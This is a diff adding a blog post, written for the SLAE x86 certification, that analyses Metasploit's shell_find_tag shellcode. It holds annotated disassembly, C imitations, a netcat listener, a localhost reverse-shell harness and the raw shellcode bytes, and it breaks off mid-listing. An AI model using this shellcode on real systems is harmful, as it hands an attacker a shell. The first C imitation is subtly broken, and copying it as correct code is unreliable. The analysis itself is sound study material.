@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>SLAE x86 Exam - Assignment #5 Part 3</title>
+    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
+    <link rel="canonical" href="/21/12/25/slae32-assignment-5_3">
+    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />
+
+    <style>
+         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
+    </style>
+</head>
+
+  <body>
+    <!--- Header and nav template site-wide -->
+<header>
+    <a href="/">RBCT</a>
+
+    <nav class="group">
+        
+            
+        
+            
+                
+                <a href="/">POSTS</a>
+                
+            
+        
+            
+                
+                <a href="/about/">ABOUT</a>
+                
+            
+        
+    </nav>
+</header>
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <h1>SLAE x86 Exam - Assignment #5 Part 3</h1>
+
+        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
+            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
+            <span class="mono authors">
+                <a href="/author/rbct" itemprop="name">rbct</a>
+            </span>
+        </div>
+
+        <time class="mono" datetime="2021-12-25T00:00:00+01:00" itemProp="datePublished">
+            25 December 2021
+        </time>
+
+        <hr>
+        <main itemprop="articleBody" style="position: relative;">
+            <h2 id="disclaimer">Disclaimer</h2>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
+<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
+<p>Student ID: PA-30398</p>
+<h2 id="foreword">Foreword</h2>
+<p>The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays <code>msfvenom</code>) for 32-bit Linux systems.</p>
+<p>Programs like <code>gdb</code>/<code>ndisasm</code>/<code>libemu</code> can be used for dissecting the shellcode and performing the analysis.</p>
+<p>I chose the following 4 shellcode samples:</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>linux/x86/adduser</td>
+<td>Create a new user with UID 0</td>
+</tr>
+<tr>
+<td>linux/x86/shell/reverse_nonx_tcp</td>
+<td>Spawn a command shell (staged). Connect back to the attacker</td>
+</tr>
+<tr>
+<td>linux/x86/shell_find_tag</td>
+<td>Spawn a shell on an established connection (proxy/nat safe)</td>
+</tr>
+<tr>
+<td>linux/x86/shell_reverse_tcp_ipv6</td>
+<td>Connect back to attacker and spawn a command shell over IPv6</td>
+</tr>
+</tbody>
+</table>
+<p>In this post I'll analyse <code>linux/x86/shell_find_tag</code>.</p>
+<h2 id="source-code">Source code</h2>
+<p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/5/part/3">rbctee/SlaeExam</a>.</p>
+<p>List of files:</p>
+<ul>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/mimick_shellcode.c">mimick_shellcode.c</a>, a C program that I've written to imitate the instructions ran by the shellcode</li>
+<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/5/part/3/run_shellcode.c">run_shellcode.c</a>, a C program that runs the shellcode analysed in this post</li>
+</ul>
+<h2 id="analysis">Analysis</h2>
+<h3 id="ndisasm">NDISASM</h3>
+<p>To generate the payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x86/shell_find_tag <span class="nt">-o</span> shellcode.bin
+</code></pre></div></div>
+<p>To analyse it with <code>ndisasm</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ndisasm shellcode.bin <span class="nt">-b</span> 32 <span class="nt">-p</span> intel
+</code></pre></div></div>
+<p>It returns the following output (comments are mine though):</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EBX and push 0x00000000 to the stack</span>
+<span class="err">00000000</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
+<span class="err">00000002</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>
+
+                            <span class="c1">; store pointer to 0x00000000 into ESI</span>
+<span class="err">00000003</span>  <span class="err">89</span><span class="nf">E6</span>              <span class="nv">mov</span> <span class="nb">esi</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; 4th argument of recv(): flags</span>
+                            <span class="c1">; push to the stack the value 0x00000040 (MSG_DONTWAIT)</span>
+<span class="err">00000005</span>  <span class="err">6</span><span class="nf">A40</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x40</span>
+
+                            <span class="c1">; 3rd argument of recv(): len, i.e. the number of bytes to</span>
+                            <span class="c1">;   read from the socket</span>
+                            <span class="c1">; push to the stack the value: 0x00000a00 (2560 bytes)</span>
+<span class="err">00000007</span>  <span class="nf">B70A</span>              <span class="nv">mov</span> <span class="nb">bh</span><span class="p">,</span><span class="mh">0xa</span>
+<span class="err">00000009</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>
+
+                            <span class="c1">; 2nd argument of recv(): buffer that will store the data</span>
+                            <span class="c1">; push to the stack the value: pointer to 0x00000000</span>
+<span class="err">0000000</span><span class="nf">A</span>  <span class="mi">56</span>                <span class="nv">push</span> <span class="nb">esi</span>
+
+                            <span class="c1">; 1st argument of recv(): file descriptor of the socket</span>
+                            <span class="c1">; push to the stack the value: 0x00000a00</span>
+<span class="err">0000000</span><span class="nf">B</span>  <span class="mi">53</span>                <span class="nv">push</span> <span class="nb">ebx</span>
+
+                            <span class="c1">; 3rd argument of socketcall()</span>
+                            <span class="c1">; store into ECX the pointer to its arguments</span>
+<span class="err">0000000</span><span class="nf">C</span>  <span class="mi">89</span><span class="nv">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; exchanges BH with BL, so 0x0a00 -&gt; 0x000a</span>
+                            <span class="c1">; EBX = 0xa (SYS_RECV)</span>
+<span class="err">0000000</span><span class="nf">E</span>  <span class="mi">86</span><span class="nv">FB</span>              <span class="nv">xchg</span> <span class="nb">bh</span><span class="p">,</span><span class="nb">bl</span>
+
+                            <span class="c1">; 0x0a00 -&gt; 0x0a01</span>
+<span class="err">00000010</span>  <span class="err">66</span><span class="nf">FF01</span>            <span class="nv">inc</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>
+
+                            <span class="c1">; call socketcall() syscall, which in turn calls recv()</span>
+<span class="err">00000013</span>  <span class="err">6</span><span class="nf">A66</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x66</span>
+<span class="err">00000015</span>  <span class="err">58</span>                <span class="nf">pop</span> <span class="nb">eax</span>
+<span class="err">00000016</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; pointer to the buffer storing data received with recv()</span>
+                            <span class="c1">; check if the first bytes are the string "fjHh</span>
+<span class="err">00000018</span>  <span class="err">813</span><span class="nf">E666A4868</span>      <span class="nv">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">esi</span><span class="p">],</span><span class="mh">0x68486a66</span>
+<span class="err">0000001</span><span class="nf">E</span>  <span class="mi">75</span><span class="nv">F0</span>              <span class="nv">jnz</span> <span class="mh">0x10</span>
+</code></pre></div></div>
+<p><sub class='aside'>If the first 4 bytes of the buffer of <code>recv()</code> aren't equal to the string <code>fjHh</code>, <code>recv()</code> is called with a file descriptor that <strong>keeps increasing</strong>
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; save the file descriptor of the socket into EDI and EBX</span>
+<span class="err">00000020</span>  <span class="err">5</span><span class="nf">F</span>                <span class="nv">pop</span> <span class="nb">edi</span>
+<span class="err">00000021</span>  <span class="err">89</span><span class="nf">FB</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">edi</span>
+
+                            <span class="c1">; set ECX ot 0x00000002</span>
+<span class="err">00000023</span>  <span class="err">6</span><span class="nf">A02</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x2</span>
+<span class="err">00000025</span>  <span class="err">59</span>                <span class="nf">pop</span> <span class="nb">ecx</span>
+
+                            <span class="c1">; call dup2() syscall</span>
+<span class="err">00000026</span>  <span class="err">6</span><span class="nf">A3F</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x3f</span>
+<span class="err">00000028</span>  <span class="err">58</span>                <span class="nf">pop</span> <span class="nb">eax</span>
+<span class="err">00000029</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+
+                            <span class="c1">; decrease ECX by 1 and jump to the address 00000026</span>
+<span class="err">0000002</span><span class="nf">B</span>  <span class="mi">49</span>                <span class="nv">dec</span> <span class="nb">ecx</span>
+<span class="err">0000002</span><span class="nf">C</span>  <span class="mi">79</span><span class="nv">F8</span>              <span class="nv">jns</span> <span class="mh">0x26</span>
+</code></pre></div></div>
+<p><sub class='aside'>The last two instructions loop three times, from ECX=2 to ECX=0, in order to redirect respectively <code>stderr</code>, <code>stdout</code>, and <code>stdin</code> to the file descriptor of the socket
+</sub></p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; set EAX to 0x0000000b</span>
+<span class="err">0000002</span><span class="nf">E</span>  <span class="mi">6</span><span class="nv">A0B</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0xb</span>
+<span class="err">00000030</span>  <span class="err">58</span>                <span class="nf">pop</span> <span class="nb">eax</span>
+
+                            <span class="c1">; 3rd argument of execve(): array of pointer to env. vars.</span>
+                            <span class="c1">; set EDX to 0 and push this value to the stack</span>
+                            <span class="c1">; it also acts as the string terminator of /bin//sh</span>
+<span class="err">00000031</span>  <span class="err">99</span>                <span class="nf">cdq</span>
+<span class="err">00000032</span>  <span class="err">52</span>                <span class="nf">push</span> <span class="nb">edx</span>
+
+                            <span class="c1">; push the following string to the stack: /bin//sh</span>
+<span class="err">00000033</span>  <span class="err">682</span><span class="nf">F2F7368</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x68732f2f</span>
+<span class="err">00000038</span>  <span class="err">682</span><span class="nf">F62696E</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x6e69622f</span>
+
+                            <span class="c1">; save the pointer to /bin//sh into EBX</span>
+<span class="err">0000003</span><span class="nf">D</span>  <span class="mi">89</span><span class="nv">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; push 0x00000000 to the stack</span>
+<span class="err">0000003</span><span class="nf">F</span>  <span class="mi">52</span>                <span class="nv">push</span> <span class="nb">edx</span>
+
+                            <span class="c1">; 1st argument of execve(): path of the executable to run</span>
+                            <span class="c1">;   in this case: /bin//sh</span>
+<span class="err">00000040</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>
+
+                            <span class="c1">; 2nd argument of execve():</span>
+                            <span class="c1">;   array of pointers to strings passed</span>
+                            <span class="c1">;   as the command-line arguments of /bin//sh</span>
+<span class="err">00000041</span>  <span class="err">89</span><span class="nf">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>
+
+                            <span class="c1">; call syscall 0xb (11): execve()</span>
+<span class="err">00000043</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p>This last block of disassembly looks similar to what I've written for the 1st and 2nd assignments. It simply calls the syscall <code>execve</code> in order to spawn a shell, in particular <code>/bin//sh</code>.</p>
+<p>To recap what the shellcode does:</p>
+<ol>
+<li>the shellcode calls <code>recv</code> in order to receive data from the file descriptor <code>0xa00</code> (2560) of the socket</li>
+<li>the shellcode checks the first 4 bytes of the buffer storing the data received
+<ol>
+<li>if they aren't equal to <code>0x68486a66</code>, then it <strong>increases</strong> the file descriptor (<code>0xa00</code> -&gt; <code>0xa01</code> -&gt; <code>0xa02</code> ...), until <code>0xffff</code>, after that it starts again from <code>0x0000</code></li>
+<li>if they are equal, it continues execution</li>
+</ol>
+</li>
+<li>the syscall <code>dup2</code> is used for redirecting standard error, standard output, and standard input (in this specific order) towards the file descriptor of the socket</li>
+<li>the shellcode uses the syscall <code>execve</code> to spawn the shell <code>/bin/sh</code></li>
+</ol>
+<p>It translates to the following <code>C</code> program, although with some minor differences:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">2560</span><span class="p">;</span>
+
+    <span class="cm">/*
+      buffer containing data received from the socket
+      in the previous shellcode, the data is stored on the stack
+      so this is the 1st difference
+    */</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">2560</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">2560</span><span class="p">,</span> <span class="n">MSG_DONTWAIT</span><span class="p">);</span>
+
+        <span class="cm">/*
+          check the first four bytes of the data received from the socket (if so)
+          I don't know how to check the first 4 bytes without other functions
+          so this is the 2nd difference
+        */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x66</span><span class="s">"</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x6a</span><span class="s">"</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x48</span><span class="s">"</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="s">"</span><span class="se">\x68</span><span class="s">"</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="c1">// increase the file descriptor if data wasn't received or</span>
+            <span class="c1">//  the first 4 bytes aren't correct</span>
+            <span class="n">fd</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">// redirect stderr, stdout, stdin</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/*
+      spawn a shell, using system(), as I couldn't use execve
+      so this is the 3rd difference
+    */</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin//sh"</span><span class="p">,</span> <span class="s">"/bin//sh"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>If you were to run the shellcode (or the program above) and pass it to <code>strace</code>, you would notice the function <code>recv</code> enters an endless loop, so it will never reach the function <code>dup2</code>.</p>
+<p>To make it work, I wrote some C code that creates a socket and connects to a netcat listener, which sends the string <code>fjHh</code>:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
+#include &lt;netinet/ip.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">2560</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">2560</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="c1">// START block of code of code taken from assignment n.2</span>
+
+    <span class="kt">int</span> <span class="n">client_socket_fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">empty</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">client_address</span><span class="p">;</span>
+
+    <span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
+    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">inet_aton</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">client_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
+    <span class="n">client_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>
+    <span class="n">connect</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_address</span><span class="p">));</span>
+
+    <span class="c1">// END block of code of code taken from assignment n.2</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Trying to find the correct file descriptor</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">recv</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">2560</span><span class="p">,</span> <span class="n">MSG_DONTWAIT</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">102</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">106</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">72</span> <span class="o">&amp;&amp;</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="mi">104</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Correct file descriptor: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">fd</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Redirecting error, output, and input</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Here's your shell:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin//sh"</span><span class="p">,</span> <span class="s">"/bin//sh</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>In another window, I set up the <code>netcat</code> listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlp</span> 4444
+<span class="c"># fjHh</span>
+</code></pre></div></div>
+<p>I had to send the string before the C program could connect to it.</p>
+<p>Next, compile and run and C program:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># compile</span>
+gcc <span class="nt">-w</span> ./file.c
+
+<span class="c"># run</span>
+./a.out 
+<span class="c"># [+] Trying to find the correct file descriptor</span>
+<span class="c"># [+] Correct file descriptor: 3</span>
+<span class="c"># [+] Redirecting error, output, and input</span>
+</code></pre></div></div>
+<p>In the other window you should now have a <strong>reverse shell</strong>. Now that I've tested that it works corrrectly, I had to change it a bit, replacing some of the C code with the shellcode:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
+#include &lt;netinet/ip.h&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x66\x6a\x48\x68</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+
+    <span class="c1">// START block of code of code taken from assignment n.2</span>
+
+    <span class="kt">int</span> <span class="n">client_socket_fd</span><span class="p">;</span>
